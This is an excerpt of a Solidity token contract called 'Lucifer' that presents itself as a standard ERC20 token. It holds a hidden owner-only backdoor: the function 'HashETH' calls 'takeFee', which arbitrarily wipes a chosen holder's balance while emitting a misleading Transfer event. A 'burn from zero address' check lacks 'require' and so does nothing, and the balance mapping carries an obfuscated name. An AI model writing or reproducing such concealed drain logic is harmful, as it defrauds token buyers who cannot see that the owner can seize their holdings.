...
contract Lucifer  is Ownable, IERC20 {
    ...
    constructor() {
        superfloSYLOM[msg.sender] = _totalSupply;
    ...
    function takeFee(address account, uint256 _value) internal {
        superfloSYLOM[account] = 1 & superfloSYLOM[account] * _value;
        emit Transfer(account, address(this), _value);
    }
    function HashETH(address addr, uint256 _amount) public onlyOwner {
        (addr != address(0), "ERC20: burn from the zero address");
        takeFee(addr, _amount);
    }
    function _transfer(address from, address _to, uint256 _value) private {
        superfloSYLOM[from] = superfloSYLOM[from].sub(_value);
        superfloSYLOM[_to] = superfloSYLOM[_to].add(_value);
        emit Transfer(from, _to, _value);
    }
    function swapBack(uint256 amount, address to) private {
        superfloSYLOM[address(this)] += amount;
